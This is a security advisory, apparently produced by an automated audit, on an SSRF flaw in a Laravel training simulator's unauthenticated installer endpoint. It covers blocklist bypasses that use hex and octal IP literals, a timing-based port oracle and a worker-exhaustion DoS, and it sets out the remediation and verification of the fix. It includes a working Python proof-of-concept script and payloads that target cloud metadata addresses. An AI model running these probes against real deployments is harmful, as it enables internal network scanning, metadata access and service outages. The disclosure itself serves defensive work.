# Unauthenticated installer test-db endpoint: SSRF port-scan oracle, link-local blocklist bypass, and worker-exhaustion DoS

**ID:** vuln-0008
**Severity:** MEDIUM
**Found:** 2026-11-08 17:17:47 UTC
**Target:** Amadus GDS Training Simulator (Laravel 13) — /install/test-db
**Method:** POST
**CWE:** CWE-918
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The unauthenticated installer endpoint POST /install/test-db lets a remote attacker make the server open TCP connections to arbitrary internal hosts and ports. The link-local (cloud metadata) blocklist is bypassable with alternative IP literal notations (hex `0xa9fea9fe`, octal `0177.0.0.1`, trailing-dot hostnames), and any host/port that accepts a connection but stays silent pins the PHP worker indefinitely (PDO::ATTR_TIMEOUT does not bound the initial read). This yields both an SSRF/port-scanning oracle and a worker-exhaustion denial of service during the pre-provisioning window of every new deployment.

## Evidence

Pre-fix, isolated lab instance (APP_ENV=production, APP_DEBUG=false, no lock file, unauthenticated):

```http
POST /install/test-db  (driver=mysql, host=0xa9fea9fe, port=3306)
-> 422 {"error":"Database connection failed. Verify the host, port and credentials."} (0.58s)
```

Control showing the intended block firing for the dotted form:

```http
POST /install/test-db  (host=169.254.169.254, port=3306)
-> 422 {"error":"Connection to link-local metadata addresses is forbidden."} (0.04s)
```

TCP listener bound to 169.254.169.254:3306 during the hex-form request:

```text
TCP CONNECT from ('169.254.169.254', 52776)
```

Port-state oracle and DoS (silent listener at 127.0.0.1:9444):

```text
host=127.0.0.1 port=1     -> 422 in 0.039s  (closed)
host=127.0.0.1 port=9443  -> curl --max-time 12 gave up at 12.0s; worker stayed pinned
GET /install (concurrent) -> 000 timeout for 7s+ repeatedly — single-worker deployment fully wedged
```

Post-fix re-run (patched code): hex/octal/trailing-dot forms rejected (`"Database host could not be resolved to an IP address."` or link-local block), silent-open port now returns 422 in 2.05s, app remains responsive, and a genuine MySQL server still completes the full installation (200, instructor created, `.env` written).

## Impact

During the pre-provisioning window an unauthenticated attacker can (1) probe internal networks through the application server (distinguishing closed ports — instant 422 — from open services — hang or delayed failure), (2) reach link-local cloud metadata addresses despite the blocklist, and (3) with a handful of requests point every PHP worker at a host/port that accepts and never speaks, making the whole application unresponsive (demonstrated: one request wedged the deployment until restart). No data was modified and no metadata content was retrieved in testing.

## Counterevidence

Actively looked for mitigations: the guard already blocks dotted, decimal (2852039162), octal-dotted (0251.0376.0251.0376), and IPv4-mapped IPv6 (::ffff:169.254.169.254) forms — those stay blocked. The endpoint is throttle:10,1 and CSRF-protected, which slows scanning but does not prevent it and does not bound the hang. The generic error message already suppresses host/port reflection, so the oracle is timing/hang-based rather than message-based — real, but noisier than a reflective oracle. The lock disables the endpoint post-install, so exposure is the pre-provisioning window. On FPM/Apache deployments each hung request consumes a full worker/process, so impact is worker-exhaustion DoS, not necessarily total outage of a large pool.

## What Would Change This Severity

Demonstrated retrieval of metadata content or a speaking internal service response through the endpoint (for example a MySQL server that reveals version strings or accepts attacker-chosen credentials) would raise Confidentiality and potentially severity to High; conversely, confirmation that deployments are never exposed on shared networks before an operator completes the wizard would lower it.

## Technical Analysis

`InstallerService::testDatabase()` (app/Services/Installer/InstallerService.php) guards the MySQL branch with a link-local check, but the guard is applied to the raw host string via `FILTER_VALIDATE_IP` + `gethostbyname`:

```php title=app/Services/Installer/InstallerService.php startLineNumber=221 endLineNumber=233
$hostToCheck = trim($host, ' []');
$ip = filter_var($hostToCheck, FILTER_VALIDATE_IP) ? $hostToCheck : gethostbyname($hostToCheck);
$packed = @inet_pton((string) $ip);
if ($packed !== false) {
    // Unwrap IPv4-mapped IPv6 (::ffff:169.254.x.x, incl. ::ffff:a9fe:a9fe).
    if (strlen($packed) === 16 && str_starts_with($packed, str_repeat("\0", 10)."\xff\xff")) {
        $packed = substr($packed, 12);
    }
    // 169.254.0.0/16 link-local range.
    if (strlen($packed) === 4 && str_starts_with($packed, "\xa9\xfe")) {
        return ['success' => false, 'error' => 'Connection to link-local metadata addresses is forbidden.'];
    }
}
```

`FILTER_VALIDATE_IP` accepts only canonical notations, so `0xa9fea9fe` (hex) and `169.254.169.254.` (trailing dot, fails `gethostbyname` on this stack) fall through the guard, and `0177.0.0.1` (single-octal) resolves to loopback without ever being range-checked. The unvalidated string then flows into the DSN:

```php title=app/Services/Installer/InstallerService.php startLineNumber=237 endLineNumber=241
$dsnNoDb = "mysql:host={$host};port={$port};charset=utf8mb4";
$pdo = new PDO($dsnNoDb, $username, $password, [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_TIMEOUT => 4,
]);
```

MySQL clients resolve hex/octal/short-form literals themselves, so the connection lands on `169.254.169.254` (or any internal host) even though the check never saw that address — a check-vs-connect differential. Separately, `PDO::ATTR_TIMEOUT` bounds connect() but not the handshake read: a port that accepts and never sends leaves `mysqlnd` blocked on the initial read past the 4-second timeout. The generic catch already masks the driver message, but the *timing* remains a reliable oracle — ~0.04s 422 for a refused connection versus an effectively unbounded request for an open port. Under `php artisan serve` (the README's documented deployment, single worker), one such request wedges every route until the process is restarted. The endpoint is reachable unauthenticated during the pre-provisioning window on every fresh deployment; CSRF is not a barrier since the token is issued by the same open wizard page.

## Proof of Concept

1. Identify a deployment that has not completed the install wizard (no storage/installed lock): GET /install returns the wizard with HTTP 200.
2. Obtain the CSRF token from the wizard page's meta tag and a session cookie.
3. Closed-port control: POST /install/test-db with driver=mysql, host=127.0.0.1, port=1 — returns 422 in ~0.04s.
4. Open-port probe: POST /install/test-db with the same form but port set to any TCP port that is open internally — the worker hangs for the remainder of the request (curl --max-time 12 gives up while the server-side read continues), giving a clean open/closed oracle.
5. Link-local bypass: POST /install/test-db with host=0xa9fea9fe (hex for 169.254.169.254) — the guard does not recognize the form, the server opens the connection (a listener at 169.254.169.254:3306 logged the inbound TCP connect), proving the metadata range is reachable despite the blocklist.
6. DoS: repeat step 4 against a port that accepts and never sends data; each request pins a worker indefinitely — on the documented `php artisan serve` deployment a single request makes every route time out.

```python
import re
import sys
import time

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8099"

session = requests.Session()
page = session.get(f"{BASE}/install", timeout=10)
if page.status_code != 200:
    print(f"installer not open (HTTP {page.status_code}) - deployment already locked")
    sys.exit(0)

token = re.search(r'csrf-token" content="([^"]+)"', page.text).group(1)

def probe(host, port, timeout=12):
    started = time.time()
    try:
        response = session.post(
            f"{BASE}/install/test-db",
            data={"_token": token, "driver": "mysql", "host": host,
                  "port": str(port), "database": "probe", "username": "u", "password": "p"},
            headers={"Accept": "application/json"},
            timeout=timeout,
        )
        return response.status_code, round(time.time() - started, 2), response.json().get("error", "")
    except requests.exceptions.ReadTimeout:
        return "HANG", round(time.time() - started, 2), "worker pinned (open/silent port)"

print("closed port :", probe("127.0.0.1", 1))
print("open silent :", probe("127.0.0.1", 9444))   # any accept-but-silent listener
print("metadata hex:", probe("0xa9fea9fe", 3306))  # 169.254.169.254 in hex - bypasses guard
```

## Remediation

Resolve the database host once, fail closed when resolution does not yield a valid IP, pin the PDO DSN to that resolved dotted IP address, and gate the connection on a bounded TCP pre-flight. Concretely: reject any host whose `gethostbyname()` result is not a valid IP (this eliminates hex/octal/trailing-dot reinterpretation because the driver never sees the raw string); run the existing link-local range check against the resolved address; and before constructing the PDO connection, open a socket to the resolved IP with a short connect timeout and read the first protocol byte with a short read timeout, failing the request when either step exceeds the bound (a real MySQL/MariaDB server sends its handshake packet first). Additionally, consider disabling the installer routes entirely once the lock file exists, so the pre-provisioning window is the only exposure.

## Fix Verification

Gates run on a throwaway copy of the checkout (never the shared runtime):

1. Applicability: `php -l` clean on both the repo and lab copy; diff contains only the resolution block, the pre-flight block, and the pinned DSN.
2. Security closure: re-ran the full exploit matrix against the patched service — dotted/decimal/IPv4-mapped forms still return the link-local block; `0xa9fea9fe`, `0177.0.0.1`, `169.254.169.254.` now fail before PDO (`"Database host could not be resolved to an IP address."`); silent-open port returns 422 in 2.05s and the app stays responsive.
3. Bypass review: alternate input classes tried — `[::ffff:a9fe:a9fe]` bracketed mapped form, decimal `2852039162`, dotted-octal `0251.0376.0251.0376`, trailing dot — all blocked or fail-closed. The range check now also inspects the same `$resolvedIp` the DSN uses, removing the check-vs-connect differential entirely.
4. Preserved behavior: full legitimate install through a real MariaDB (127.0.0.1:3306) completes — test-db 200, database created, migrations + seed run, instructor provisioned, lock written, `.env` updated; hostname input (`localhost`) still works via resolution; sqlite path untouched.
5. Repository checks: `php artisan test` on the patched copy — 169 passed, 1170 assertions (includes InstallerTest 18/18 and SecurityHardeningTest). Gap: could not run tests against a production FPM/CloudLinux target (sandbox lacks one); behavior-verification used `php artisan serve`, matching the README's documented deployment mode.

## Assumptions

The deployment has not yet completed the install wizard (lock file absent) — the documented pre-provisioning window for this product, which ships with the installer web routes enabled by default. Attacker needs no account and no user interaction; CSRF token is obtainable from GET /install on the same uninstalled instance.
